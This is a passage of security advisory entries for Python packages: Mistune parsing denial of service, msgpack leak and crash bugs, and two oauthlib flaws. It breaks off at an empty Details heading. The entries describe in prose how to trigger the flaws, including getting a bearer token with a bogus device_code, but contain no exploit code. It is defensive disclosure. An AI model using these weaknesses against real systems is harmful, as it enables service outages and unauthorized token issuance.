vulnerabilities.Description: Mistune is a Python Markdown parser with renderers and plugins. Prior to 3.3.0, long sequences of well-formed double-asterisk or triple-asterisk emphasis pairs around a character cause quadratic work in src/mistune/inline_parser.py because the parser scans forward for matching close markers from every potential opening run, allowing denial of service in default Mistune parsing. This issue is fixed in version 3.3.0.

vulnerabilities.Title: mistune: Mistune: Denial of Service via crafted Markdown document with reference-link definitions
vulnerabilities.Description: Mistune is a Python Markdown parser with renderers and plugins. Prior to 3.3.0, a Markdown document containing many repeated or distinct reference-link definitions causes quadratic work in src/mistune/block_parser.py and the ref_links environment dictionary handling, allowing denial of service through CPU exhaustion. This issue is fixed in version 3.3.0.

vulnerabilities.Title: msgpack: msgpack: Denial of Service via memory leak during map deserialization
vulnerabilities.Description: MessagePack is the serializer implementation for Python msgpack.org. Prior to 1.2.3, the msgpack-python C extension (msgpack._cmsgpack) leaks a decoded map value when deserialization rejects a key with strict_map_key=True (the default). Repeated malformed inputs can cause unbounded process memory growth and denial of service in applications that deserialize attacker-controlled MessagePack data. Both unpackb() and the streaming Unpacker API are affected. The pure-Python fallback does not exhibit this leak in the reported tests. This issue is fixed in version 1.2.3.

vulnerabilities.Title: MessagePack for Python: Out-of-bounds read / crash on Unpacker reuse after a caught error
vulnerabilities.Description:
### Impact

If the Unpacker is used repeatedly after an error occurs, the process may crash with a SEGV.

If the Unpacker is used repeatedly to unpack untrusted input from external sources, it may be vulnerable to a DoS attack.

### Patches

v1.2.1

### Workarounds

Users should create a new Unpacker instead of reusing the same Unpacker after an error occurs.

Applying the above patch can prevent SEGV, but reusing the Streaming Unpacker after it has encountered an error will not yield correct data. If an error occurs during Streaming Unpacking, the Stream and Streaming Unpacker should be discarded.

Therefore, this is not just a workaround but the correct solution. The above patch only prevents crashes from incorrect usage.

vulnerabilities.Title: oauthlib: oauthlib: privilege escalation via client identity confusion in token grant handlers
vulnerabilities.Description: OAuthLib is an implementation of the OAuth request-signing logic for Python 3.6+. Prior to 4.0.0, the client_credentials and Resource Owner Password Credentials token grant handlers can authenticate request.client as one confidential client while retaining an attacker-supplied request.client_id for validate_grant_type and validate_scopes. A lower-privilege authenticated client can therefore cause grant and scope authorization to use another client's identity when an application validator relies on the documented client_id argument, potentially issuing tokens with unauthorized grants or scopes. Validators that authorize exclusively from request.client may not be affected. This issue is fixed in version 4.0.0.

vulnerabilities.Title: OAuthLib: Bearer token can be retrieved as long as client knows a valid client ID for device workflow
vulnerabilities.Description:
### Summary
A call to the token endpoint with a grant type of `"urn:ietf:params:oauth:grant-type:device_code"` and a bogus `device_code` is able to get a bearer token as long as they know a valid client ID enabled for the device workflow.

### Details
